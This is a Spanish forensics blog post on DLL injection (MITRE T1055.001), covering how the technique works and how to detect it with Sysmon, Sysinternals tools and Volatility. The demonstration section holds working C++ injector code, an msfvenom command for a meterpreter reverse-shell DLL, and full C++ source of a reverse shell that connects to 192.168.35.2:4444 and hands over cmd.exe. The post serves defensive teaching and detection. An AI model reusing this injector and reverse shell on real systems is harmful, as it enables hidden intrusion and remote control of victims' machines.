---
title: DLL Injection
date: 2026-03-10 19:30:00 +0100
categories: [Blog, Forensics]
tags: [dfir, dll injection, process injection, volatility, blog]     # TAG names should always be lowercase
author: julian
description: Process Injection (T1055) es una técnica utilizada ampliamente en las intrusiones realizadas por actores maliciosos o malware para conseguir ejecutar código en memoria ocultándose en un proceso ajeno. En esta publicación hablaremos de la subtécnica DLL Injection (T1055.001) y el método de análisis y detección que se puede llevar a cabo ante estos casos.
# contents:
comments: false
image: /assets/img/blog/dll-injection/entrada blog.png
---

Es posible que hayas visto este meme alguna vez. También es posible que, debido a la calidad del humor desprendida por el mismo, no te lo hayas planteado nunca, pero este meme hace referencia a una de las técnicas más utilizadas a día de hoy por malware y actores maliciosos para realizar actividad maliciosa pasando desapercibido: ***Process Injection***. 

![meme.jpg](/assets/img/blog/dll-injection/notepad4444.jpg)

# Process Injection - T1055
*Process Injection* (T1055) es una técnica utilizada ampliamente en las intrusiones realizadas por actores maliciosos o malware para conseguir ejecutar código en memoria ocultándose en un proceso ajeno. Mediante la ejecución de código malicioso en el espacio de memoria de un proceso ajeno se pretende evadir las protecciones del sistema víctima así como también llevar a cabo una posible escalada de privilegios[^1]. 

Normalmente, para realizar un *Process Injection* se llevan a cabo los siguientes pasos:
1. Abrir el proceso víctima donde se va a inyectar el código malicioso
2. Reservar espacio de memoria en el proceso víctima
3. Escribir el código maliciosa en el espacio reservado anteriormente
4. Ejecutar el código en un hilo instanciado en el proceso víctima

![Visualización gráfica de un Process Injection](/assets/img/blog/dll-injection/process-injection-image.png)
*Visualización gráfica de un Process Injection[^2]*

Existen diferentes maneras de llevar a cabo un *Process Injection* en un sistema, algunas más utilizadas que otras. A pesar de que no es de las técnicas de *Process Injection* más utilizadas[^22], en esta publicación se habla de la subtécnica ***DLL Injection*** (T1055.001) y el método de análisis y detección que se puede llevar a cabo.

# Dynamic-link Library Injection - T1055.001

*DLL Injection* se refiere a la ejecución de código en un proceso ajeno mediante la inyección de un DLL en el proceso víctima. La manera más simple de realizar un DLL Injection se lleva a cabo a través de la utilización de llamadas a la API de Windows[^3]. De esta forma, la inyección del DLL se realiza de la siguiente manera:
1. **Apertura del proceso víctima:** Mediante la llamada a la función `OpenProcess` se abre un objecto de proceso local existente indicando el Process ID (PID) que se desea abrir y -en caso de éxito- obteniendo como respuesta un *handle* del proceso abierto[^4].
2. **Reserva de memoria:** La función `VirtualAllocEx` permite aumentar el espacio de memoria virtual de un proceso especificado (utilizando el *handle* obtenido en el paso anterior). La memoria reservada se inicializa vacía (a ceros) y se obtiene como resultado de la ejecución de la función la dirección de memoria de inicio del nuevo espacio reservado[^5]. En este tipo de inyección, **no se reserva el espacio en memoria equivalente al tamaño del DLL que se pretende inyectar**, solamente se necesita reservar espacio suficiente para contener la ruta del DLL en disco.
3. **Escritura de código:** Una vez reservado el espacio de memoria necesario en el proceso víctima, hay que escribir la información necesaria en dicho espacio llamando a la función `WriteProcessMemory` indicando el *handle* obtenido en el primer paso y la dirección de memoria devuelta por `VirtualAllocEx` en el paso anterior[^6]. En este caso, se escribirá la ubicación del DLL en disco (el *path* absoluto).
4. **Ejecución del código inyectado:** Finalmente, para ejecutar el DLL inyectado en el proceso víctima se utiliza la función `CreateRemoteThread`[^7]. La función `CreateRemoteThread` se encarga de crear un hilo que ejecute el código inyectado y necesita los siguientes parámetros:
> {: .prompt-info}
> El objeto encargado de ejecutar código en un Sistema Operativo son los hilos, los cuales existen bajo el contexto de los procesos que los crean y contienen el código que debe ser ejecutado. **Los procesos no ejecutan código, son los hilos existentes dentro de los procesos los que lo ejecutan**[^8][^9][^10]
   1. El *handle* del proceso abierto en el primer paso.
   2. La dirección de memoria devuelta por `VirtualAllocEx` en el segundo paso
   3. La dirección de memoria de `LoadLibrary`, la cual exporta el DLL `Kernel32.dll`.


## Precondiciones
Para que un *DLL Injection* pueda llevarse a cabo debe cumplirse una de las 2 condiciones siguientes: 
- El usuario que instanció el proceso atacante debe tener el mismo Security ID (SID) que el del proceso víctima.
- El usuario debe contar con el privilegio SeDebugPrivilege[^11]. Este privilegio es necesario para depurar (*debug*) y realizar modificaciones en el espacio de memoria de procesos ajenos. Cuando se cuenta con este privilegio, el acceso al proceso objetivo se garantiza a pesar de que los SIDs de atacante y víctima no coincidan.

¿Quién tiene el privilegio SeDebug en un sistema Windows? -> Pues, por defecto, todos los usuarios del grupo *Administrators*[^17]. Además, la cuenta `SYSTEM` cuenta con este privilegio[^18], por lo que si el atacante ha conseguido escalar hacia `SYSTEM` también dispondrá de SeDebug (aunque, si este fuese el caso, un *DLL Injection* no sería el mayor problema).

<!--Entonces, eliminando este privilegio del grupo *Administrators* deberias estar a salvo, ¿no?. Pues no. Es posible llevar a cabo un *Process Injection* sin este privilegio utilizando otras técnicas, pero eso es algo que se verá más adelante.-->

## Puesta en práctica
Para ilustrar la capacidad del *DLL Injection* vamos a ver cómo de simple es implementarlo y aplicarlo. En este caso, se instancia un proceso y se inyecta un DLL en dicho proceso con el mismo usuario, por lo que SeDebug no es necesario.
> {: .prompt-info}
> La implementación del código malicioso no es el objetivo principal de la publicación. Para la realización de la prueba me he guiado por repositorios públicos o publicaciones similares[^12][^13].\\
> Es recomendable revisar la documentación de las funciones de la API de Windows así como de las estructuras de datos utilizadas[^14][^15][^16].

Como se puede observar, en el código se le indica la ruta absoluta del DLL y se realizan los pasos mencionados anteriormente, sin mayor misterio. También se utiliza la función `OpenProcessW` para abrir el proceso `notepad.exe` en el que se va a inyectar el código. En este caso, el proceso malicioso (`DLL_Injection.exe`) es el que instancia `notepad.exe` y realiza la inyección en él, por lo que no sería necesario contar con el privilegio SeDebug (ambos procesos cuentan con el mismo SID).

```cpp
#include <iostream>
#include <cstdio>
#include <windows.h>
#include <tlhelp32.h>


char dllPath[] = "MyEvilDLL.dll";

int main()
{
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    wchar_t cmd[] = L"notepad.exe";
    
    if (CreateProcessW(NULL,   // lpApplicationName
        cmd,    // lpCommandLine
        NULL,   // lpProcessAttributes --> Al establecerlo a null se utiliza el security descriptor por defecto (el del usuario): https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
        NULL,   // lpThreadAttributes
        FALSE,  // bInheritHandles
        0,      // dwCreationFlags
        NULL,   // lpEnvironment
        NULL,   // lpCurrentDirectory
        &si,
        &pi))
    {

        // Primer parámetro (dwDesiredAccess): "Si el autor de la llamada ha habilitado el privilegio SeDebugPrivilege, 
        // se concede el acceso solicitado independientemente del contenido del descriptor de seguridad."
        HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE,pi.dwProcessId);

        // Reservar memoria para la ruta del DLL con permisos de lectura y escritura para alojar el DLL
        LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);

        if (pDllPath) {
            // Escribir en la ruta de memoria reservada la ruta del DLL malicioso
            if (WriteProcessMemory(handle, pDllPath, (LPCVOID)dllPath, strlen(dllPath) + 1, 0)) {
                HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
                    (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
            }


        }
        // Cerrar handles de proceso
        // Definido en doc Windows: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information#remarks
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
```

Para generar el DLL malicioso se podría utilizar `Metasploit` con un reverse shell que nos abra un `meterpreter` en la máquina atacante o programar un DLL muy simple en C++ que realice una conexión a una máquina externa y genere un `cmd` desde el que ejecutar comandos de manera remota. 

Con el comando `msfvenom` se puede generar el DLL utilizando el siguiente comando: 
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -f dll LHOST=<IP atacante> LPORT=<puerto> > MyEvilDLL.dll
``` 
Este DLL ejecutaría una shell reversa a través del ejecutable de Windows `rundll32.exe` como proceso hijo de `notepad.exe`.

Para esta demostración he preferido utilizar un DLL hecho en C++ sacado de la publicación [Simple C++ reverse shell for windows](https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html).
```cpp
#include "pch.h"
#include "framework.h"
#include "MyEvilDLL.h"
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")
#include <WS2tcpip.h>

VOID WINAPI openRemoteCMD() {
    /*
    shell.cpp
    author: @cocomelonc
    windows reverse shell without any encryption/encoding
    */
    WSADATA wsaData;
    SOCKET wSock;
    struct sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    // listener ip, port on attacker's machine
    const char* ip = "192.168.35.2";
    short port = 4444;

    // init socket lib
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // create socket
    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    InetPtonA(AF_INET,ip,&hax.sin_addr.s_addr);

    // connect to remote host
    WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

    // start cmd.exe with redirected streams
    wchar_t cmd[] = L"cmd.exe";
    CreateProcessW(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sui, &pi);
}
```

El flujo del proceso malicioso es el siguiente:
- Un proceso cualquiera (`DLL_Injection.exe`) instancia `notepad.exe` y crea un hilo en ese proceso que ejecuta algo. 
- Tras instanciar un proceso hijo y crear un hilo en ese mismo proceso, el proceso padre termina sin que termine su proceso hijo `notepad.exe`.
- El proceso `notepad.exe` abre una conexión remota al puerto 4444 e instancia un proceso `cmd.exe` que redirige a través de esta conexión hacia el atacante.

> {: .propmt-info}
> El DLL malicioso que utiliza el atacante debe existir en disco para que se pueda cargar y ejecutar a través de `LoadLibraryA`. Esto supone una desventaja frente a otras técnicas *fileless* ya que permitiría a herramientas de seguridad analizar el fichero en disco y exponerse a que sea categorizado como malicioso o que en un análisis post-mortem se pueda recuperar el fichero a través de un triage o un clonado de disco.

## Análisis

### Sysmon
En el repostiorio [sysmon-modular](https://github.com/olafhartong/sysmon-modular) se encuentran diferentes configuraciones de Sysmon que permiten mayor o menor verbosidad en el registro que realiza de la actividad en el equipo. Para esta publicación, la configuración `default+` ha sido suficiente para registrar los eventos necesarios para detectar el *DLL Injection*.

En el canal de logs de Sysmon se observan los siguientes eventos relacionados:
- EventID 1 - ProcessCreate
  - Se instancia el proceso `DLL_Injection.exe`
  - El proceso `DLL_Injection.exe` instancia el proceso `notepad.exe`. De este evento obtenemos el nombre del proceso padre, el PPID, el nombre del proceso instanciado y su PID. ![](/assets/img/blog/dll-injection/sysmon-default+_0_ProcessCreateNotepad-DLLINJECTION.png)
- EventID 8 - CreateRemoteThread
  - El proceso `DLL_Injection.exe` crea un hilo nuevo en el proceso `notepad.exe` ![](/assets/img/blog/dll-injection/sysmon-default+_1_CreateRemoteThreadDetection.png)
    - En este caso, sin el EventID 7 de Sysmon[^20] no podemos confirmar el qué (este evento genera demasiada volumetría, por lo que no suele estar activado). 
- EventID 4 - ProcessTerminated
  - El proceso `DLL_Injection.exe` finaliza antes que su proceso hijo `notepad.exe` ![](/assets//img/blog/dll-injection/sysmon-default+_2_ProcessTerminated_BeforeChildProcess.png)
- EventID 1 - ProcessCreate
  - El proceso `notepad.exe` instancia el `cmd.exe` ![](/assets/img/blog/dll-injection/sysmon-default+_3_ProcessCreateCMD-NOTEPAD.png)
- EventID 3 - NetworkConnect
  - El proceso `notepad.exe` realiza una conexión de red hacia una IP externa al puerto 4444 ![](/assets/img/blog/dll-injection/sysmon-default+_4_Notepad-connection.png)
  
### Análisis dinámico
Utilizando *Process Monitor* (aka Procmon) y *ProcessExplorer* de Sysinternals[^21] se observa la actividad descrita. 

*Process Explorer* ofrece --entre otras funcionalidades-- una vista del árbol de procesos en tiempo real, por lo que tras la salida del proceso inicial `DLL_Injection.exe` solamente se observa el proceso `notepad.exe` instanciando como proceso hijo `cmd.exe`. \\
![](/assets/img/blog/dll-injection/processExplorer_dllinjection.png)
*Árbol de procesos visto desde Process Explorer*

Desde Procmon se puede monitorizar toda la actividad relativa a los procesos de un sistema. Además, como *Process Explorer*, permite obtener una vista del árbol de procesos, mostrando también procesos terminados.\\
![](/assets/img/blog/dll-injection/procmon64_processTree_dllinjection.png)
*Árbol de procesos visto desde Procmon*

Adentrándose en la información que arroja Procmon sobre el proceso `DLL_Injection.exe`, se observa detalladamente la actividad realizada por el mismo y sus procesos hijos.

1. El proceso `DLL_Injection.exe` instancia `notepad.exe`. ![](/assets/img/blog/dll-injection/procmon64_timelineInjectionNotepad.png)
2. Instantes después, el proceso `notepad.exe` carga un DLL llamado `MyEvilDLL.dll` (ya tenemos un nombre y su ruta absoluta que no se pudo conseguir con Sysmon). Con la carga de este DLL se ejecutará la rutina DLLMain que contiene. ![](/assets/img/blog/dll-injection/procmon64_timelineInjectionNotepad_MyEvilDLL-Load.png)
3. Tras cargar y ejecutar el DLL, se observa una conexión TCP desde el proceso `notepad.exe` a una IP remota al puerto 4444. ![](/assets/img/blog/dll-injection/procmon64_timelineInjectionNotepad_MyEvilDLL-TCP_CONN.png)
4. Finalmente, se observa a `notepad.exe` creando el proceso `cmd.exe`. ![](/assets/img/blog/dll-injection/procmon64_timelineInjectionNotepad_MyEvilDLL-cmd_create.png)
> {: .prompt.info}
> Como curiosidad, si el atacante ejecutase algún comando de manera errónea, en el registro de actividad de Procmon se mostraría una búsqueda de fichero sin éxito. ![](/assets/img/blog/dll-injection/procmon64_timelineInjectionNotepad_MyEvilDLL-cmd_comando_equivocado.png)
> *Ejecución del comando de Unix `ls` en la shell reversa*

### Volatility
Como se acaba de ver, *DLL Injection* es un método de ejecución de código malicioso ocultado en procesos legítimos. ¿Cómo se detecta esta técnica mediante en análisis de memoria con Volatility3?

Ejecutando el plugin `windows.pstree.PsTree` para ver el árbol de procesos del sistema en el momento de la adquisición de memoria, se puede ver una relación de procesos totalmente sospechosa. Nos encontramos con un proceso `notepad.exe` cuyo proceso padre no está presente en memoria (algo a tener en cuenta) y del que "cuelga" un proceso `cmd.exe` (totalmente malicioso). 
![](/assets/img/blog/dll-injection/volatility%20-%20pstree%20filtrado.png)
*Lista de procesos del sistema (filtrada) obtenidos con `windows.pstree.PsTree`*

Esto que se acaba de señalar, es posible verlo también a través del plugin `windows.pslist.PsList`, aunque este plugin no ofrece una salida tan visual y requiere fijarse un poco más.
![](/assets/img/blog/dll-injection/volatility%20-%20pslist%20filtrado.png)
*Lista de procesos del sistema (filtrada) obtenidos con `windows.pslist.PsList`*

Si analizamos las conexiones abiertas del sistema, saltará a la vista rápidamente que hay un proceso que no debería aparecer aquí listado. ¿Notepad realizando conexiones TCP 🤯?
![](/assets/img/blog/dll-injection/volatility%20-%20netstat%20notepad.png)
*Conexiones de la máquina obtenidas con `windows.netstat.NetStat`*

Con los plugins ejectuados hasta el momento ya queda claro que el proceso `notepad.exe` con PID 5984 tiene algo raro que pretende ocultarse bajo un proceso legítimo. Podríamos comenzar a teorizar sobre la técnica utilizada por el atacante. Pero como ya se conoce de antemano (esta publicacion va de *DLL Injection*), vamos a echar un vistazo a los DLLs cargados por el proceso sospechoso.
![](/assets/img/blog/dll-injection/volatility%20-%20dlllist.png)
*DLLs cargados cargados por el proceso extraídos con `windows.dllist.DllList`* 

La mayoría de DLLs cargados están en `C:\Windows\System32\`, pero hay alguno que no se encuentra ahí. Si se filtra la salida se puede observar un path bastante sospechoso, que no pertenece a ninguna ruta común o legítima de DLLs asociados a `notepad.exe`.
![](/assets/img/blog/dll-injection/volatility%20-%20dlllist%20filtrado.png)
*Paths de los DLLs cargados en el proceso `notepad.exe`*
![evil dll path](/assets/img/blog/dll-injection/dll_myevil.png)
*Path completo del DLL ubicado en path sospechoso*

# Resumen
Las técnicas de *Process Injection* son ampliamente utilizadas por actores maliciosos en la post-explotación de los sistemas comprometidos que controlan. En esta publicación se ha presentado la subtécnica *DLL Injection*, describiendo su implementación y comportamiento. Una vez descrito y entendido su comportamiento, el análisis con herramientas como Sysmon, la suite de Sysinternals o Volatility se vuelve trivial.

# Próximos pasos
En publicaciones siguientes se hablará sobre otras técnicas de *Process Injection* comunes y listadas en la matriz de MITRE. También se tendrán en cuenta medidas de protección que pueden influir en las capacidades de un atacante de realizar este tipo de inyecciones.


# Referencias
[^1]: [MITRE ATT&CK - Process Injection (T1055)](https://attack.mitre.org/techniques/T1055/)
[^2]: [The Pool Party You Will Never Forget: New Process Injection Techniques Using Windows Thread Pools](https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/)
[^3]: [MITRE ATT&CK - Process Injection: Dynamic-link Library Injection (T1055.001)](https://attack.mitre.org/techniques/T1055/001/)
[^4]: [https://learn.microsoft.com/gl-es/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess?redirectedfrom=MSDN](https://learn.microsoft.com/gl-es/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
[^5]: [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
[^6]: [https://learn.microsoft.com/gl-es/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory](https://learn.microsoft.com/gl-es/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
[^7]: [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
[^8]: [Processes and Threads](https://learn.microsoft.com/en-us/windows/win32/procthread/processes-and-threads)
[^9]: [Processs and Thread Management](https://os.inf.tu-dresden.de/Studium/AusgewaehlteBS/windows/Folien/04_Process/04_Process_4.pdf)
[^10]: [Understanding EPROCESS Structure](https://info-savvy.com/wp-content/uploads/2020/07/Understanding-EProcess-Structure-infosavvy.jpg)
[^11]: [https://learn.microsoft.com/es-es/windows/win32/secauthz/privilege-constants#constants](https://learn.microsoft.com/es-es/windows/win32/secauthz/privilege-constants#constants)
[^12]: [IDouble/Simple-DLL-Injection](https://github.com/IDouble/Simple-DLL-Injection)
[^13]: [Find process ID by name and inject to it. Simple C++ example.](https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html)
[^14]: [https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32)
[^15]: [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information)
[^16]: [https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)
[^17]: [Debug programs](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs#default-values)
[^18]: [https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
[^19]: [Sysmon](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/Sysmon.md)
[^20]: [Image Loading - Sysmon](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md)
[^21]: [Sysinternals](https://learn.microsoft.com/es-es/sysinternals/)
[^22]: [Can You Run My Code? A Close Look at Process Injection in Windows Malware](https://dl.acm.org/doi/epdf/10.1145/3708821.3736206)
